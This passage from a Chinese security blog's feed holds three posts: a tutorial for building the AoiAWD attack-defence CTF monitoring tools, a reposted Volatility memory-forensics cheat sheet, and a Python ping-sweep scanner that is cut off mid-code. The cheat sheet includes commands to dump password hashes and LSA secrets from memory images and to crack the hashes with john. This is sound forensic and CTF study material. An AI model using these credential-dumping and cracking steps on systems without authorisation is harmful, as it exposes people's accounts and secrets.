      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AoiAWD编译搭建教程与简单使用</title>
      <link href="/posts/d3e6ed5d/"/>
      <url>/posts/d3e6ed5d/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/english_3.jpg" loading="lazy"><br>夜空中最亮的星，能否听清，那仰望的人，心底的孤独和叹息！</p><a id="more"></a><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>参加线下AWD，关于AWD的知识，以前写过一篇文章在微信公众号上————信安之路<a href="https://mp.weixin.qq.com/s/on7P3CTQ9lphE_lj8x2rjQ">https://mp.weixin.qq.com/s/on7P3CTQ9lphE_lj8x2rjQ</a><br>这次关于Github上的开源项目<a href="https://github.com/DasSecurity-HatLab/AoiAWD">AoiAWD</a>进行搭建编译做一次总结和教程吧。</p><h1 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h1><p>参考：<a href="https://www.wlhhlc.top/posts/16692/#AoiAWD-Core">https://www.wlhhlc.top/posts/16692/#AoiAWD-Core</a><br>我这里使用的是阿里云的主机Ubuntu 18.04</p><ul><li>首先是要进行更新<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential</code></pre></li><li>git如果没有就安装一下，有就不用了<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span class="token function">git</span> clone https://github.com.cnpmjs.org/DasSecurity-HatLab/AoiAWD.git</code></pre></li><li>安装inotifywait<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> inotifywait   <span class="token comment">#新建文件夹</span><span class="token builtin class-name">cd</span> inotifywait      <span class="token comment">#进入文件夹</span><span class="token function">wget</span> http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz   <span class="token comment">#下载</span><span class="token function">tar</span> zxf inotify-tools-3.14.tar.gz   <span class="token comment">#解压</span><span class="token builtin class-name">cd</span> inotify-tools-3.14/./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> <span class="token comment">#安装</span></code></pre>可用<code>man inotifywait</code>命令查看文档以确定是否安装正确，然后按q退出<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210616001852.png" loading="lazy"></li><li>安装mongdb需要的依赖<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mongodb-server<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-dev php-pear<span class="token function">sudo</span> pecl <span class="token function">install</span> mongodb</code></pre>截图就不放了，在上面参考那个搭建过程中也有，或者就是没有爆红就是应该没问题了。<br>出现了提示<code>You should add &quot;extension=mongodb.so&quot; to php.ini</code>说明成功了，接着我们去php的配置文件<code>php.ini</code>进行修改<br>路径一般为:<code>/etc/php/7.2/cli/php.ini</code>，接着我们去拓展处加上<code>extension=mongodb.so</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210616002331.png" loading="lazy"><br>然后再把这两个开关改成Off，记住要把前面的分号去掉，不然会被注释掉<br>建议下载php.ini文件到本地记事本查看修改。直接在文件中查找<code>Phar</code>片可以快速定位到。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210616002306.png" loading="lazy"></li><li>构建Fronted项目<br>主要是这里，这里是我写这篇博客的原因所在<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">npm</span>      <span class="token comment">#安装npm</span><span class="token builtin class-name">cd</span> AoiAWD  <span class="token comment">#进入下载的项目</span><span class="token builtin class-name">cd</span> Frontend<span class="token function">npm</span> <span class="token function">install</span><span class="token function">npm</span> run build</code></pre>这里不使用npm来进行搭建。<br>我这里使用一个替代品<code>yarn</code>比较快。<pre class="language-bash" data-language="bash"><code class="language-bash">安装yarn：npm <span class="token function">install</span> -g <span class="token function">yarn</span>查看版本号：yarn -v安装依赖项：yarn <span class="token function">install</span></code></pre>然后需要设置一下<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">yarn</span> config <span class="token builtin class-name">set</span> ignore-engines <span class="token boolean">true</span></code></pre>不设置的话会报错<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>/vue-hackernews-2.<span class="token operator"><span class="token file-descriptor important">0</span>></span> <span class="token function">yarn</span><span class="token function">yarn</span> <span class="token function">install</span> v1.12.3<span class="token punctuation">[</span><span class="token number">1</span>/5<span class="token punctuation">]</span> Validating package.json<span class="token punctuation">..</span>.<span class="token punctuation">[</span><span class="token number">2</span>/5<span class="token punctuation">]</span> Resolving packages<span class="token punctuation">..</span>.<span class="token punctuation">[</span><span class="token number">3</span>/5<span class="token punctuation">]</span> Fetching packages<span class="token punctuation">..</span>.info fsevents@1.1.3: The platform <span class="token string">"win32"</span> is incompatible with this module.info <span class="token string">"fsevents@1.1.3"</span> is an optional dependency and failed compatibility check. Excluding it from installation.error upath@1.0.4: The engine <span class="token string">"node"</span> is incompatible with this module. Expected version <span class="token string">">=4 &lt;=9"</span><span class="token builtin class-name">.</span> Got <span class="token string">"10.14.2"</span>error Found incompatible moduleinfo Visit https://yarnpkg.com/en/docs/cli/install <span class="token keyword">for</span> documentation about this command.</code></pre>安装好yarn后，也设置好config后。<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">yarn</span> <span class="token function">install</span><span class="token function">yarn</span> build</code></pre><img src="https://gitee.com/m0re/picture/raw/master/img/20210616002946.png" loading="lazy"></li><li>构建AoiAWDcore<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> AoiAWD<span class="token function">rm</span> -rf src/public/*<span class="token comment">#删除</span><span class="token function">cp</span> -r <span class="token punctuation">..</span>/Frontend/dist/* src/public/  <span class="token comment">#复制静态资源</span>php compile.php</code></pre>执行成功后得到aoiawd.phar</li><li>构建TapeWorm<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> TapeWormphp compile.php</code></pre>构建成功后得到tapeworm.phar</li><li>构建Guardian<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Guardianphp compile.php</code></pre>构建成功后得到guardian.phar</li><li>构建RoundWorm<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> RoundWorm<span class="token function">make</span></code></pre>构建成功会得到roundworm<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1>使用方法在官方文档中说明。这里说一下需要注意的点</li><li>php环境：由于是在php7.2的环境下编译的，所以在使用时，要保证php环境在7.2以上，测试5.5及以下不可运行。</li><li>上传至服务器中并赋予执行权限。<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x tapeworm.phar<span class="token function">chmod</span> +x roundworm<span class="token function">chmod</span> +x guardian.phar./tapeworm.phar -d 目录 -s ip:port./roundworm  -w 目录 -s <span class="token function">ip</span> -p port./guardian.phar -i 目录 -s ip:port</code></pre><code>./aoiawd.phar</code>运行结果图是<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210616233431.png" loading="lazy"><br>访问端口默认是1337端口，可以看到web服务<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210616233936.png" loading="lazy"><br>输入生成的token即可进入<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210616234047.png" loading="lazy"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>取证工具volatility使用参数说明</title>
      <link href="/posts/c6e31ef3/"/>
      <url>/posts/c6e31ef3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/SR_46.jpg" loading="lazy"></p><p>我就在云深不知处，寻得你好苦</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>关于这个工具，我也是每次用到都去百度查各种文章，前段时间看了一篇文章，大佬写的很详细，所以想转载一下。这里先附上原文链接。<br><a href="https://blog.csdn.net/qq_38626043/article/details/108883112">https://blog.csdn.net/qq_38626043/article/details/108883112</a></p><h1 id="0x01-volatility"><a href="#0x01-volatility" class="headerlink" title="0x01 volatility"></a>0x01 volatility</h1><p>volattity命令格式及常用参数：</p><pre class="language-xml" data-language="xml"><code class="language-xml">volatility 使用：        volatility -f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>文件名</span><span class="token punctuation">></span></span> -–profile=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>配置文件</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>插件</span><span class="token punctuation">></span></span> [插件参数] 通过volatility --info获取工具所支持的profile，Address Spaces，Scanner Checks，Plugins 常用插件：imageinfo：显示目标镜像的摘要信息，知道镜像的操作系统后，就可以在 –profile 中带上对应的操作系统pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程mendump：提取出指定进程，常用foremost 来分离里面的文件filescan：扫描所有的文件列表hashdump：查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容svcscan：扫描 Windows 的服务connscan：查看网络连接</code></pre><h2 id="参数大全"><a href="#参数大全" class="headerlink" title="参数大全"></a>参数大全</h2><pre class="language-xml" data-language="xml"><code class="language-xml"> Supported Plugin Commands:amcache         Print AmCache information//打印AmCache信息apihooks        Detect API hooks in process and kernel memory//检测进程和内核内存中的API挂钩atoms           Print session and window station atom tables//打印会话和窗口站atom表atomscan        Pool scanner for atom tables//用于atom表的池扫描程序auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv//auditpol从HKLM \ SECURITY \ Policy \ PolAdtEv中打印出审核策略bigpools        Dump the big page pools using BigPagePoolScanner// bigpools使用BigPagePoolScanner转储大页面池bioskbd         Reads the keyboard buffer from Real Mode memory// bioskbd从实模式内存中读取键盘缓冲区cachedump       Dumps cached domain hashes from memory//从内存中转储缓存的域哈希callbacks       Print system-wide notification routines//回调打印系统范围的通知例程clipboard       Extract the contents of the windows clipboard//剪贴板提取Windows剪贴板的内容cmdline         Display process command-line arguments//显示进程命令行参数cmdscan         Extract command history by scanning for _COMMAND_HISTORY//通过扫描_COMMAND_HISTORY提取命令历史记录connections     Print list of open connections [Windows XP and 2003 Only]//列印已开启的连接[只适用于windowsxp及2003]connscan        Pool scanner for tcp connections//用于tcp连接的池扫描程序consoles        Extract command history by scanning for _CONSOLE_INFORMATION通过扫描_CONSOLE_INFORMATION提取命令历史记录crashinfo       Dump crash-dump information//转储崩溃转储信息deskscan        Poolscaner for tagDESKTOP (desktops)//用于tagDESKTOP的Poolscaner（桌面）devicetree      Show device tree//显示设备树dlldump         Dump DLLs from a process address space//从进程地址空间中转储DLLdlllist         Print list of loaded dlls for each process//打印每个进程已加载的dll的列表driverirp       Driver IRP hook detection//驱动程序IRP挂钩检测drivermodule    Associate driver objects to kernel modules//将驱动程序对象与内核模块相关联driverscan      Pool scanner for driver objects//池扫描程序中的驱动程序对象dumpcerts       Dump RSA private and public SSL keys//转储RSA专用和公用SSL密钥dumpfiles       Extract memory mapped and cached files//取内存映射和缓存的文件dumpregistry    Dumps registry files out to disk //将注册表文件转储到磁盘editbox         Displays information about Edit controls. (Listbox experimental.)//显示有关“编辑”控件的信息。 （实验性的列表框。）envars          Display process environment variables//显示流程环境变量eventhooks      Print details on windows event hooks//在Windows事件挂钩上打印详细信息evtlogs         Extract Windows Event Logs (XP/2003 only)//提取Windows事件日志（仅适用于XP / 2003）filescan        Pool scanner for file objects//池扫描程序中的文件对象gahti           Dump the USER handle type information//转储USER句柄类型信息                gditimers       Print installed GDI timers and callbacks//打印已安装的GDI计时器和回调gdt             Display Global Descriptor Table//显示全局描述符表getservicesids  Get the names of services in the Registry and return Calculated SID//获取注册表中的服务名称，并返回计算出的SIDgetsids         Print the SIDs owning each process//打印拥有每个进程的SIDhandles         Print list of open handles for each process//打印每个进程的打开句柄列表hashdump        Dumps passwords hashes (LM/NTLM) from memory//从内存中转储密码散列(LM/NTLMhibinfo         Dump hibernation file information//转储休眠文件信息hivedump        Prints out a hive//打印一个配置单元hivelist        Print list of registry hives.//打印注册表配置单元列表。hivescan        Pool scanner for registry hives//注册表配置单元的池扫描程序hpakextract     Extract physical memory from an HPAK file//从HPAK文件提取物理内存hpakinfo        Info on an HPAK file//有关HPAK文件的信息idt             Display Interrupt Descriptor Table//显示中断描述符表iehistory       Reconstruct Internet Explorer cache / history//重建Internet Explorer缓存/历史记录imagecopy       Copies a physical address space out as a raw DD image//将物理地址空间复制为原始DD图像imageinfo       Identify information for the image //标识图像信息impscan         Scan for calls to imported functions//扫描对导入功能的调用joblinks        Print process job link information//打印过程作业链接信息kdbgscan        Search for and dump potential KDBG values//搜索并转储潜在的KDBG值kpcrscan        Search for and dump potential KPCR values//搜索和转储潜在的KPCR值ldrmodules      Detect unlinked DLLs//检测链接dlllsadump         Dump (decrypted) LSA secrets from the registry//从注册表转储(解密的)LSA机密machoinfo       Dump Mach-O file format information//转储Mach-O文件格式信息malfind         Find hidden and injected code//找到隐藏的和注入的代码mbrparser       Scans for and parses potential Master Boot Records (MBRs) //扫描和解析潜在主引导记录(mbr)memdump         Dump the addressable memory for a process//转储进程的可寻址内存memmap          Print the memory map//打印内存映射messagehooks    List desktop and thread window message hooks//列出桌面和线程窗口消息挂钩mftparser       Scans for and parses potential MFT entries //扫描和解析潜在的MFT条目moddump         Dump a kernel driver to an executable file sample//将内核驱动程序转储到可执行文件示例modscan         Pool scanner for kernel modules//内核模块的池扫描程序modules         Print list of loaded modules//打印加载模块的列表multiscan       Scan for various objects at once//一次扫描各种物体mutantscan      Pool scanner for mutex objects//池扫描互斥对象notepad         List currently displayed notepad text//列表当前显示的记事本文本objtypescan     Scan for Windows object type objects//扫描Windows对象类型的对象patcher         Patches memory based on page scans//基于页面扫描的内存补丁poolpeek        Configurable pool scanner plugin//可配置的池扫描器插件printkey        Print a registry key, and its subkeys and values//打印注册表项及其子项和值privs           Display process privileges//显示过程的特权procdump        Dump a process to an executable file sample//将进程转储到可执行文件示例pslist          Print all running processes by following the EPROCESS lists //按照EPROCESS列表打印所有正在运行的进程psscan          Pool scanner for process objects//进程对象的池扫描程序pstree          Print process list as a tree//以树的形式打印过程列表psxview         Find hidden processes with various process listings//使用各种进程列表查找隐藏的进程qemuinfo        Dump Qemu information//转储Qemu信息raw2dmp         Converts a physical memory sample to a windbg crash dump//将物理内存示例转换为windbg崩溃转储screenshot      Save a pseudo-screenshot based on GDI windows//保存一个基于GDI窗口的伪截图servicediff     List Windows services (ala Plugx)//列出Windows服务(ala Plugx)sessions        List details on _MM_SESSION_SPACE (user logon sessions)//列出关于_MM_SESSION_SPACE(用户登录会话)的详细信息shellbags       Prints ShellBags info//打印ShellBags信息shimcache       Parses the Application Compatibility Shim Cache registry key//解析应用程序兼容性垫片缓存注册表项shutdowntime    Print ShutdownTime of machine from registry//从注册表打印停机时间的机器sockets         Print list of open sockets//打印打开的套接字列表sockscan        Pool scanner for tcp socket objects//用于tcp套接字对象的池扫描程序ssdt            Display SSDT entries//SSDT条目显示strings         Match physical offsets to virtual addresses (may take a while, VERY verbose)//将物理偏移量匹配到虚拟地址(可能需要一段时间，非常冗长)svcscan         Scan for Windows services//扫描Windows服务symlinkscan     Pool scanner for symlink objects//符号链接对象的池扫描程序thrdscan        Pool scanner for thread objects//线程对象的池扫描程序threads         Investigate _ETHREAD and _KTHREADstimeliner       Creates a timeline from various artifacts in memory //从内存中的各种工件创建时间线timers          Print kernel timers and associated module DPCs//打印内核计时器和相关模块DPCstruecryptmaster Recover TrueCrypt 7.1a Master Keys//恢复TrueCrypt 7.1a主密钥truecryptpassphrase     TrueCrypt Cached Passphrase Finder//TrueCrypt缓存了密码短语查找器truecryptsummary        TrueCrypt Summary//TrueCrypt总结unloadedmodules Print list of unloaded modules//打印已卸载模块列表userassist      Print userassist registry keys and information//打印userassist注册表项和信息userhandles     Dump the USER handle tables//转储用户句柄表vaddump         Dumps out the vad sections to a file//将vad节转储到一个文件中vadinfo         Dump the VAD info//转储VAD信息vadtree         Walk the VAD tree and display in tree format//遍历VAD树并以树格式显示vadwalk         Walk the VAD tree//走在树下vboxinfo        Dump virtualbox information//转储virtualbox信息verinfo         Prints out the version information from PE images//从PE图像打印出版本信息vmwareinfo      Dump VMware VMSS/VMSN information//转储VMware VMSS/VMSN信息volshell        Shell in the memory image//贝壳在记忆中的形象windows         Print Desktop Windows (verbose details)//打印桌面窗口(详细信息)wintree         Print Z-Order Desktop Windows Tree//打印z顺序桌面Windows树wndscan         Pool scanner for window stations//池扫描窗口站yarascan        Scan process or kernel memory with Yara signatures//用Yara签名扫描进程或内核内存</code></pre><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><pre class="language-xml" data-language="xml"><code class="language-xml">linux_apihooks             - 检查用户名apihookslinux_arp                  - 打印ARP表linux_aslr_shift           - 自动检测Linux aslr改变linux_banner               - 打印Linux Banner信息linux_bash                 - 从bash进程内存中恢复bash历史记录linux_bash_env             - 恢复一个进程的动态环境变量linux_bash_hash            - 从bash进程内存中恢复bash哈希表linux_check_afinfo         - 验证网络协议的操作函数指针linux_check_creds          - 检查是否有任何进程正在共享凭证结构linux_check_evt_arm        - 检查异常向量表以查找系统调用表钩子linux_check_fop            - 检查rootkit修改的文件操作结构linux_check_idt            - 检查IDT是否被更改linux_check_inline_kernel  - 检查内联内核挂钩linux_check_modules        - 将模块列表与sysfs信息进行比较linux_check_syscall        - 检查系统调用表是否已被更改linux_check_tty            - 检查tty的钩子linux_cpuinfo              - 打印有关每个活动处理器的信息linux_dentry_cache         - 从dentry缓存收集文件linux_dmesg                - 收集dmesg bufferlinux_dump_map             - 将选定的内存映射写入到磁盘linux_dynamic_env          - 恢复进程的动态环境变量linux_elfs                 - 在进程映射中找ELF二进制文件linux_enumerate_files      - 列出文件系统缓存引用的文件linux_find_file            - 列出并从内存中恢复文件linux_getcwd               - 列出每个进程的当前工作目录linux_hidden_modules       - Carves内存寻找隐藏的内核模块linux_ifconfig             - 收集活动接口linux_info_regs            - GDB中的“info寄存器”。它打印出所有的输出linux_iomem                - 提供与/proc/iomem相似的输出linux_kernel_opened_files  - 列出从内核中打开的文件linux_keyboard_notifiers   - 解析键盘通知调用链linux_ldrmodules           - 将proc映射的输出与libdl中的库列表进行比较linux_library_list         - 将库加载到一个进程中linux_librarydump          - 将进程内存中的共享库转储到磁盘linux_list_raw             - 列出应用程序与混杂的套接字linux_lsmod                - 收集加载内核模块linux_lsof                 - 列出文件描述符及其路径linux_malfind              - 查找可疑的过程映射linux_memmap               - 转储用于linux任务的内存映射linux_moddump              - 提取加载内核模块linux_mount                - 收集挂载的fs/devices linux_mount_cache          - 收集从kmem_cache安装的fs/设备。linux_netfilter            - 列出Netfilter钩子linux_netscan              - 刻画网络连接结构linux_netstat              - 列表打开的套接字linux_pidhashtable         - 通过PID哈希表枚举进程linux_pkt_queues           - 将每个进程的数据包队列写入磁盘linux_plthook              - 扫描ELF二进制文件 PLT hookslinux_proc_maps            - 收集进程内存映射linux_proc_maps_rb         - 通过映射红黑树收集linux的进程映射linux_procdump             - 将进程的可执行映像转储到磁盘linux_process_hollow       - 检查是否有进程被挖空的迹象linux_psaux                - 收集进程和完整的命令行和开始时间linux_psenv                - 收集进程及其静态环境变量linux_pslist               - 收集活动任务通过task_struct->task listlinux_pslist_cache         - 从kmem_cache中收集计划任务linux_psscan               - 扫描进程的物理内存linux_pstree               - 显示进程之间的父/子关系linux_psxview              - 查找隐藏进程与各种各样的进程列表linux_recover_filesystem   - 从内存中恢复整个缓存的文件系统linux_route_cache          - 从内存中恢复路由缓存linux_sk_buff_cache        - 从sk_buff kmem_cache中恢复数据包linux_slabinfo             - 在一台正在运行的机器上模拟/proc/slabinfo。linux_strings              - 将物理偏移量匹配到虚拟地址(可能需要一段时间，非常详细)linux_threads              - 打印进程的线程linux_tmpfs                - 从内存中恢复tmpfs文件系统。linux_truecrypt_passphrase - 恢复缓存Truecrypt口令linux_vma_cache            - 从vm_area_struct 缓存中收集VMAslinux_volshell             - 内存映像中的shell linux_yarascan             - Linux内存映像中的一个shell</code></pre><h2 id="常见Windows工具进程名"><a href="#常见Windows工具进程名" class="headerlink" title="常见Windows工具进程名"></a>常见Windows工具进程名</h2><pre class="language-xml" data-language="xml"><code class="language-xml">TrueCrypt.exe 磁盘加密工具notepad.exe 自带记事本mspaint.exe 自带画图工具iexplore.exe IE浏览器DumpIt.exe 内存镜像提取工具</code></pre><h2 id="部分命令使用"><a href="#部分命令使用" class="headerlink" title="部分命令使用"></a>部分命令使用</h2><pre class="language-python" data-language="python"><code class="language-python">volatility <span class="token operator">-</span>f memory<span class="token punctuation">.</span>dmp <span class="token operator">-</span><span class="token operator">-</span>profile<span class="token operator">=</span>Win7SP1x64 cmdscan</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210613152238.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python">volatility <span class="token operator">-</span>f memory<span class="token punctuation">.</span>dmp <span class="token operator">-</span><span class="token operator">-</span>profile<span class="token operator">=</span>Win7SP1x64 printkey</code></pre><p>输出注册表子项目<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210613152434.png" loading="lazy"><br>还有<code>-k</code>参数，继续向下一层进行查看。</p><pre class="language-python" data-language="python"><code class="language-python">volatility <span class="token operator">-</span>f memory<span class="token punctuation">.</span>dmp <span class="token operator">-</span><span class="token operator">-</span>profile<span class="token operator">=</span>Win7SP1x64 lsadump</code></pre><blockquote><p><code>$MACHINE.ACC</code>：域身份验证Microsoft。<br><code>DefaultPassword</code>：启用自动登录后用于登录Windows的密码。<br><code>NL $ KM</code>：用于加密缓存的域密码的密钥解密LSA密钥。<br><code>L $ RTMTIMEBOMB_ *</code>：时间戳记提供未激活的Windows副本停止工作的日期。<br><code>L $ HYDRAENCKEY_ *</code>：用于远程桌面协议（RDP）的私钥。如果您还从受RDP攻击的系统中捕获了数据包，则可以从数据包捕获中提取客户端的公钥，并从内存中提取服务器的私钥。然后解密流量。</p></blockquote><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210613152743.png" loading="lazy"><br>扫描系统信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f mem.dump --profile<span class="token operator">=</span>Win7SP1x64 verinfo</code></pre><p>将内存中的某个进程数据以 dmp 的格式保存出来</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f memory.dmp --profile<span class="token operator">=</span>WinXPSP2x86 -p <span class="token punctuation">[</span>PID<span class="token punctuation">]</span> -D <span class="token punctuation">[</span>dump 出的文件保存的目录<span class="token punctuation">]</span>如：volatility -f memory.dmp --profile<span class="token operator">=</span>WinXPSP2x86 -p <span class="token number">665</span> -D ./</code></pre><p>获取到当时的网络连接情况</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>WinXPSP2x86 netscan</code></pre><p>获取 IE 浏览器的使用情况 ：</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>WinXPSP2x86 iehistory</code></pre><p>获取内存中的系统密码</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>WinXPSP2x86 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）volatility -f name --profile<span class="token operator">=</span>WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60volatility -f name --profile<span class="token operator">=</span>WinXPSP2x86 timeliner</code></pre><p>对文件查找及dumo提取某个进程：</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>Win7SP1x64 memdump -D <span class="token builtin class-name">.</span> -p <span class="token number">2872</span>strings -e l ./2872.dmp <span class="token operator">|</span> <span class="token function">grep</span> flagvolatility -f name --profile<span class="token operator">=</span>Win7SP1x64 dumpfiles -Q 0x000000007e410890 -n --dump-dir<span class="token operator">=</span>./</code></pre><p>HASH匹配用户账户名密码</p><pre class="language-bash" data-language="bash"><code class="language-bash">Hash, 然后使用john filename --format<span class="token operator">=</span>NT破解</code></pre><p>Flag字符串扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash">strings -e l <span class="token number">2616</span>.dmp <span class="token operator">|</span> <span class="token function">grep</span> flag</code></pre><p>安全进程扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>Win7SP1x64 psscan</code></pre><p>查找图片</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name--profile<span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">'jpg|png|jpeg|bmp|gif'</span>volatility -f name --profile<span class="token operator">=</span>Win7SP1x64 netscan</code></pre><p>注册表解析</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>Win7SP1x64 hivelistvolatility -f name --profile<span class="token operator">=</span>Win7SP1x64  -o 0xfffff8a000024010 printkey -K <span class="token string">"ControlSet001\Control;"</span></code></pre><p>复制、剪切版</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>Win7SP1x64 clipboardvolatility -f name --profile<span class="token operator">=</span>Win7SP1x64 dlllist -p <span class="token number">3820</span></code></pre><p>Dump所有进程</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>Win7SP1x64 memdump -n chrome -D <span class="token builtin class-name">.</span></code></pre><p>利用字符串查找download</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>Win7SP1x86 shimcache</code></pre><p>svcscan查看服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f name --profile<span class="token operator">=</span>Win7SP1x86 svcscan</code></pre>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现主机存活扫描和端口扫描</title>
      <link href="/posts/3fb2041d/"/>
      <url>/posts/3fb2041d/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/Udareadf.jpg" loading="lazy"><br>尝遍人间多少味道，看过峡谷多少沙雕！</p><a id="more"></a><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前段时间在做信安之路成长挑战的Python开发，只做了第一关，刚看了看第二关，面向百度进行编程，实现了简单的主机存活扫描，就是有点慢，应该多加载一些多进程。<br>还有就是看python开发做了一个端口扫描的功能，但是也没有实现很强的功能，慢慢努力吧。</p><h1 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h1><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token comment"># Author:@m0re</span><span class="token comment"># Blog:https://m0re.top</span><span class="token comment"># Date:2021/06/04</span><span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">ping_ip</span><span class="token punctuation">(</span>ip_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"ping"</span><span class="token punctuation">,</span> <span class="token string">"-n 1"</span><span class="token punctuation">,</span> <span class="token string">"-v 1"</span><span class="token punctuation">,</span> ip_str<span class="token punctuation">]</span>    resopnse <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>resopnse<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> line<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"TTL"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>ip_str<span class="token operator">+</span><span class="token string">' is alive'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"example:127.0.0."</span><span 